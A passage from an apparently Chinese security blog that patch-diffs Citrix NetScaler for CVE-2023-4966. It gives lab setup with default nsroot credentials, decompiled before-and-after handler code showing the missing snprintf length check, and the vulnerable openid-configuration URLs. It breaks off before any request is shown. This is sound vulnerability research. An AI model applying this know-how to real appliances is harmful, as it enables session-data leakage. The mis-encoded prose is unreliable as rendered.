<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a class="link"   href="https://www.cnblogs.com/davad/p/4871010.html" >https://www.cnblogs.com/davad/p/4871010.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://protobuf-decoder.netlify.app/" >https://protobuf-decoder.netlify.app/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_42067550/article/details/126010113" >https://blog.csdn.net/qq_42067550/article/details/126010113<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/marin-m/pbtk" >https://github.com/marin-m/pbtk<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1735973-1-1.html" >https://www.52pojie.cn/thread-1735973-1-1.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2023-4966</title>
    <url>/2023/10/24/CVE-2023-4966/</url>
    <content><![CDATA[<p>2023 å¹´ 10 æœˆ 10 æ—¥ï¼ŒCitrix å®˜æ–¹å‘å¸ƒäº†å…³äºå½±å“ Citrix ADC å’Œ NetScaler Gateway è®¾å¤‡çš„ CVE-2023-4966 å’Œ CVE-2023-4967 æ¼æ´é¢„è­¦ä¿¡æ¯ï¼Œ10 æœˆ 17 æ—¥ Citrix è¡¨ç¤ºå·²ç»ç›‘æ§åˆ°  CVE-2023-4966 æ¼æ´çš„åœ¨é‡åˆ©ç”¨ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œè¯¥æ¼æ´åœ¨ 13.1-49.15 åŠä»¥ä¸Šç‰ˆæœ¬è¢«ä¿®å¤ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä½ä¸€ä¸ªç‰ˆæœ¬çš„ 13.1-49.13(VPX) è¿›è¡Œåˆ†æï¼Œ<a class="link"   href="https://pan.baidu.com/s/15pUY2IKJN0Yj4rDt4UDyuA?pwd=doug" >ç‚¹å‡»ä¸‹è½½é•œåƒ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>å°†é•œåƒå¯¼å…¥è™šæ‹Ÿæœºå¹¶å¯åŠ¨ï¼Œåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ç³»ç»Ÿä¼šè‡ªåŠ¨è¯¢é—® IP åœ°å€ã€ç½‘å…³ç­‰ä¿¡æ¯ï¼ŒæŒ‰éœ€é…ç½®ä¹‹åè®¿é—® 443 å³å¯çœ‹åˆ° web ç®¡ç†ç•Œé¢ï¼Œé»˜è®¤è´¦æˆ·ä¸º nsroot:nsrootï¼Œç¬¬ä¸€æ¬¡ç™»å½•ä¼šæç¤ºä¿®æ”¹å¯†ç ã€‚CLI ä¹Ÿä½¿ç”¨ nsroot ç”¨æˆ·ç™»å½•ï¼Œç™»é™†åæ‰§è¡Œ shell å‘½ä»¤å³å¯è¿›å…¥ Linux root shellã€‚</p>
<p>ç”±äºæ¼æ´ä½äº Gateway æœåŠ¡ä¸­ï¼Œè¿˜éœ€è¦ç»§ç»­éƒ¨ç½² Gateway ç»„ä»¶ã€‚Citrix ADC è®¾å¤‡åªæœ‰å¯¼å…¥äº†åˆé€‚çš„æˆæƒæ‰èƒ½ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œæˆæƒå¯ä»¥å»<a class="link"   href="https://www.citrix.com/downloads/citrix-adc/virtual-appliances/netscaler-vpx-developer-edition.html" >å®˜ç½‘<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ç”³è¯·å¼€å‘è€…ç‰ˆæœ¬ï¼Œæˆ–è€…è‡ªè¡Œå¯»æ‰¾é€”å¾„è´­ä¹°ã€‚</p>
<p>åœ¨åˆå§‹ç”»é¢æ˜¾ç¤º 4 ä¸ªé€‰é¡¹ï¼Œè¦æ±‚æˆ‘ä»¬é…ç½® subnet IPã€ä¸»æœºåç§°ã€æ—¶åŒºç­‰ï¼ŒæŒ‰ç…§æç¤ºé…ç½®å¹¶å¯¼å…¥æˆæƒæ–‡ä»¶ï¼Œé‡å¯è®¾å¤‡å†ç™»å½•åˆ°åå°ï¼Œå³å¯çœ‹åˆ° Gateway åŠŸèƒ½æ¨¡å—ã€‚ç‚¹å‡»å…¶ä¸­çš„ Citrix Gateway Wizard æŒ‰ç…§æç¤ºé€æ­¥é…ç½®ï¼Œè¦æ³¨æ„çš„æ˜¯ Citrix Gateway IP Address éœ€è¦å’Œ web ç®¡ç†ç•Œé¢åœ¨ç›¸åŒç½‘æ®µå†…ã€‚</p>
<p>ä»¥ä¸Šæ­¥éª¤é…ç½®å®Œæ¯•ï¼Œåœ¨ Citrix Gateway -&gt; User Administration -&gt; AAA Users ä¸­æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼Œå–æ¶ˆå‹¾é€‰ External Authentication åˆ›å»ºä¸€ä¸ªæœ¬åœ°è´¦æˆ·ï¼Œå¡«å†™å¯†ç åå†ç‚¹å‡»å³ä¾§çš„ Intranet IP Addresses ç»™ç”¨æˆ·æ·»åŠ  VPN IP èµ„æºã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-1.png"
                     
                ></p>
<p>è¿™æ · Gateway æœåŠ¡å°±é…ç½®å¥½äº†ï¼Œè®¿é—® IP å¯ä»¥çœ‹åˆ°ç™»å½•ç•Œé¢ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>CVE-2023-4966 å®˜æ–¹æè¿°ä¸º â€œæ•æ„Ÿä¿¡æ¯æ³„éœ²â€ï¼Œå¹¶ä¸”åˆ†ç±»ä¸º CWE-119 å³ç¼“å†²åŒºè¶Šç•Œé—®é¢˜ã€‚</p>
<p>æ ¹æ® Citrix å†å²æ¼æ´çš„ç›¸å…³å¤ç°æ–‡ç« ï¼ŒGateway åŠŸèƒ½ä¸»è¦ç”± nsppe ç¨‹åºå®ç°ï¼Œæˆ‘ä»¬è·å–æ–°æ—§ä¸¤ä¸ªç‰ˆæœ¬çš„é•œåƒè¿›è¡Œè¡¥ä¸å¯¹æ¯”ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-2.png"
                     
                ></p>
<p>nsppe ç¨‹åºé»˜è®¤åŒ…å«ç¬¦å·ä¿¡æ¯ï¼Œå¹¶ä¸”æ–°ç‰ˆæœ¬æ²¡æœ‰å¾ˆå¤§çš„å˜åŠ¨ï¼Œå¯ä»¥å¾ˆå¿«æ‰¾åˆ°å­˜åœ¨å·®å¼‚çš„å‡ ä¸ªå‡½æ•°ï¼Œå¤§éƒ¨åˆ†ä¸ºå¯¹ oauth é€»è¾‘çš„ patchï¼Œå…¶ä¸­åŒ…æ‹¬æ•°ä¸ªå¯¹ memcpy æ•°æ®é•¿åº¦çš„é™åˆ¶ï¼ŒçŒœæµ‹è¿™äº›å¯èƒ½æ˜¯ oauth åŠŸèƒ½ä¸­ç¼“å†²åŒºæº¢å‡ºæˆ–è€…æ‹’ç»æœåŠ¡ç­‰é—®é¢˜ã€‚ç”±äºæŠ«éœ²ä¿¡æ¯ä¸­æœªæåŠ oauth ç›¸å…³é™åˆ¶ï¼Œæˆ‘ä»¬è®¤ä¸ºæ¼æ´å’Œè¿™äº›æ›´æ”¹æ— å…³ã€‚</p>
<p>åˆ†æè¡¥ä¸æœ€ç»ˆå®šä½åˆ°ä¸¤ä¸ªå…³é”®å‡½æ•°ï¼šns_aaa_oauthrp_send_openid_config å’Œ ns_aaa_oauth_send_openid_configï¼Œæ–°æ—§ç‰ˆæœ¬ä»£ç åˆ—ä¸¾å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauthrp_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r9</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v11; <span class="comment">// zf</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = (v2 + *(a2 + <span class="number">540</span>) - <span class="number">2</span>);</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5 != <span class="number">1</span>;</span><br><span class="line">      v7 = *(v2 + <span class="number">1</span>);</span><br><span class="line">      v8 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v6 &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; v7) &amp; (v7 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="string">&quot;https://&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(a1 + <span class="number">88</span>) &amp; <span class="number">0x100</span>) == <span class="number">0</span> )</span><br><span class="line">    v9 = <span class="string">&quot;http://&quot;</span>;</span><br><span class="line">  v10 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>LL,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;login_endpoint\&quot;: \&quot;%s%.*s/oauth/login\&quot;, \&quot;jwks_uri\&quot;: \&quot;%s%.*s/oauth/rp/certs\&quot;, \&quot;response_types_support&quot;</span></span><br><span class="line">          <span class="string">&quot;ed\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sessi&quot;</span></span><br><span class="line">          <span class="string">&quot;on_endpoint\&quot;: \&quot;%s%.*s/cgi/tmlogout\&quot;, \&quot;frontchannel_logout_supported\&quot;: false&#125;&quot;</span>,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  v11 = ns_vpn_send_response(a1, <span class="number">1048640LL</span>, print_temp_rule, v10) == <span class="number">0</span>;<span class="comment">// print_temp_rule é»˜è®¤çš„å¤§å°ä¸º 0x20000</span></span><br><span class="line">  authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">32LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauthrp_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// r9</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// cl</span></span><br><span class="line">  __int64 v8; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = &amp;v2[*(a2 + <span class="number">540</span>) - <span class="number">2</span>];</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="number">13</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v5 != <span class="number">1</span>;</span><br><span class="line">      v7 = v2[<span class="number">1</span>];</span><br><span class="line">      v8 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v6 &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; v7) &amp; (v7 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="string">&quot;https://&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (*(a1 + <span class="number">88</span>) &amp; <span class="number">0x100</span>) == <span class="number">0</span> )</span><br><span class="line">    v9 = <span class="string">&quot;http://&quot;</span>;</span><br><span class="line">  v10 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;login_endpoint\&quot;: \&quot;%s%.*s/oauth/login\&quot;, \&quot;jwks_uri\&quot;: \&quot;%s%.*s/oauth/rp/certs\&quot;, \&quot;response_types_support&quot;</span></span><br><span class="line">          <span class="string">&quot;ed\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_sessi&quot;</span></span><br><span class="line">          <span class="string">&quot;on_endpoint\&quot;: \&quot;%s%.*s/cgi/tmlogout\&quot;, \&quot;frontchannel_logout_supported\&quot;: false&#125;&quot;</span>,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2,</span><br><span class="line">          v9,</span><br><span class="line">          v8,</span><br><span class="line">          v2);</span><br><span class="line">  v11 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt;= <span class="number">0x1FFFF</span> )                         <span class="comment">// é™åˆ¶é•¿åº¦</span></span><br><span class="line">  &#123;</span><br><span class="line">    authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">    v12 = ns_vpn_send_response(a1, <span class="number">1048640LL</span>, print_temp_rule, v10);</span><br><span class="line">    authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v12 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauth_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r8</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// cl</span></span><br><span class="line">  _BOOL4 v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// zf</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = (v2 + *(a2 + <span class="number">540</span>) - <span class="number">2</span>);</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="number">13</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v5 != <span class="number">1</span>;</span><br><span class="line">      v8 = *(v2 + <span class="number">1</span>);</span><br><span class="line">      v9 = v8 &lt; <span class="number">0x40</span>u;</span><br><span class="line">      v10 = <span class="number">0x100000200</span>uLL &gt;&gt; v8;</span><br><span class="line">      v11 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v7 &amp; v10 &amp; v9) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>LL,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/login\&quot;, \&quot;token_endpoint\&quot;&quot;</span></span><br><span class="line">          <span class="string">&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;https://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported&quot;</span></span><br><span class="line">          <span class="string">&quot;\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_session&quot;</span></span><br><span class="line">          <span class="string">&quot;_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported\&quot;: true, \&quot;scopes_supported\&quot;:&quot;</span></span><br><span class="line">          <span class="string">&quot; [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;,&quot;</span></span><br><span class="line">          <span class="string">&quot; \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;email\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;https:/&quot;</span></span><br><span class="line">          <span class="string">&quot;/%.*s/oauth/idp/userinfo\&quot;, \&quot;subject_types_supported\&quot;: [\&quot;public\&quot;]&#125;&quot;</span>,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2);</span><br><span class="line">  authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">  v13 = ns_vpn_send_response(a1, <span class="number">0x100040</span>LL, print_temp_rule, v12) == <span class="number">0</span>;</span><br><span class="line">  authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">  result = <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">32LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//new</span></span><br><span class="line">__int64 __fastcall <span class="title function_">ns_aaa_oauth_send_openid_config</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v2; <span class="comment">// r8</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v8; <span class="comment">// cl</span></span><br><span class="line">  _BOOL4 v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a2 + <span class="number">532</span>);</span><br><span class="line">  v3 = &amp;v2[*(a2 + <span class="number">540</span>) - <span class="number">2</span>];</span><br><span class="line">  v4 = v3 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v3 == <span class="number">13</span> )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  v5 = v4 - v2;</span><br><span class="line">  <span class="keyword">if</span> ( ((v5 != <span class="number">0</span>) &amp; (<span class="number">0x100000200</span>uLL &gt;&gt; *v2) &amp; (*v2 &lt; <span class="number">0x40</span>u)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v5 != <span class="number">1</span>;</span><br><span class="line">      v8 = v2[<span class="number">1</span>];</span><br><span class="line">      v9 = v8 &lt; <span class="number">0x40</span>u;</span><br><span class="line">      v10 = <span class="number">0x100000200</span>uLL &gt;&gt; v8;</span><br><span class="line">      v11 = v5 - <span class="number">1</span>;</span><br><span class="line">      ++v2;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( (v7 &amp; v10 &amp; v9) != <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="built_in">snprintf</span>(</span><br><span class="line">          print_temp_rule,</span><br><span class="line">          <span class="number">0x20000</span>,</span><br><span class="line">          <span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/login\&quot;, \&quot;token_endpoint\&quot;&quot;</span></span><br><span class="line">          <span class="string">&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;: \&quot;https://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported&quot;</span></span><br><span class="line">          <span class="string">&quot;\&quot;: [\&quot;code\&quot;, \&quot;token\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end_session&quot;</span></span><br><span class="line">          <span class="string">&quot;_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_supported\&quot;: true, \&quot;scopes_supported\&quot;:&quot;</span></span><br><span class="line">          <span class="string">&quot; [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_supported\&quot;: [\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;,&quot;</span></span><br><span class="line">          <span class="string">&quot; \&quot;acr\&quot;, \&quot;amr\&quot;, \&quot;email\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoint\&quot;: \&quot;https:/&quot;</span></span><br><span class="line">          <span class="string">&quot;/%.*s/oauth/idp/userinfo\&quot;, \&quot;subject_types_supported\&quot;: [\&quot;public\&quot;]&#125;&quot;</span>,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2,</span><br><span class="line">          v11,</span><br><span class="line">          v2);</span><br><span class="line">  v13 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &lt;= <span class="number">0x1FFFF</span> )                         <span class="comment">// æ·»åŠ äº†é•¿åº¦é™åˆ¶</span></span><br><span class="line">  &#123;</span><br><span class="line">    authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">    v14 = ns_vpn_send_response(a1, <span class="number">1048640LL</span>, print_temp_rule, v12);</span><br><span class="line">    authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡å¯¹æ¯”å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ï¼Œæ–°ç‰ˆæœ¬å¯¹ snprintf è¿”å›å€¼è¿›è¡Œäº†é•¿åº¦æ£€æŸ¥ï¼Œä¸å…è®¸è¶…è¿‡ 0x1FFFFï¼Œè€Œé€†å‘å‘ç° print_temp_rule ç¼“å†²åŒºçš„å¤§å°åˆšå¥½æ˜¯ 0x20000ã€‚</p>
<p>åˆ†æä»£ç å®šä¹‰ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«æ˜¯ <code>/oauth/rp/.well-known/openid-configuration</code> å’Œ <code>/oauth/idp/.well-known/openid-configuration</code> çš„ handlerï¼Œå‘åŒ…æµ‹è¯•è¿™ä¸¤ä¸ª URLï¼Œè¿”å›ä¿¡æ¯å¦‚ä¸‹</p>
